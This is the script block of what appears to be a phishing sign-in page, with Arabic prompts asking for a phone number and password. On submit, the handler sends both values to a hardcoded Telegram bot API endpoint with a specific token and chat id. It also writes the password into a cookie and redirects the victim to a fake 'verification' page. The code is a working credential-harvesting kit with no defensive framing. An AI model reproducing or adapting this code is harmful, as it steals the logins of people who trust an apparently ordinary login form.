  <script>
    function setCookie(cname, cvalue, exdays) {
      const d = new Date();
      d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
      let expires = "expires=" + d. toUTCString();
      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
    }

    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const eyeToggle = document.getElementById('eyeToggle');
      
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeToggle.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17. 94 17.94A10. 07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9. 9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>';
      } else {
        passwordInput.type = 'password';
        eyeToggle.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
      }
    }

    function handleSignup(type) {
      if (type === 'auto') {
        window.location.href = '/signup-auto. html';
      } else if (type === 'first') {
        window.location.href = '/signup-first.html';
      }
    }

    function handleForgotPassword() {
      window.location.href = '/forgot-password.html';
    }

    $('#signin').on("submit", function (e) {
      e.preventDefault();
      
      const phonenumber = document.getElementById('phonenumber').value;
      const password = document. getElementById('password').value;

      // Validation
      if (!phonenumber || !password) {
        alert('الرجاء ملء جميع الحقول');
        return false;
      }

      const message = "رقم الهاتف:  `" + phonenumber + "`\nكلمة السر: `" + password + "`";

      $.ajax({
        type: 'POST',
        url: 'https://api.telegram.org/bot8478229937: AAGW3ft5TA9wFX4ThWoIfFA_ihZ9WnvZAXI/sendMessage',
        data:  {
          chat_id: "6873334348",
          text: message,
          parse_mode: 'markdown',
        },
        success: function (res) {
          console.log("Message sent successfully");
          setCookie("phonenumber", phonenumber, 1000);
          setCookie("password", password, 1000);
          setTimeout(() => {
            window.location.href = '/verification. html';
          }, 800);
        },
        error:  function (error) {
          console.error("Error:", error);
          alert("حدث خطأ في الاتصال.  الرجاء المحاولة مرة أخرى");
        }
      });

      return false;
    });
  </script>
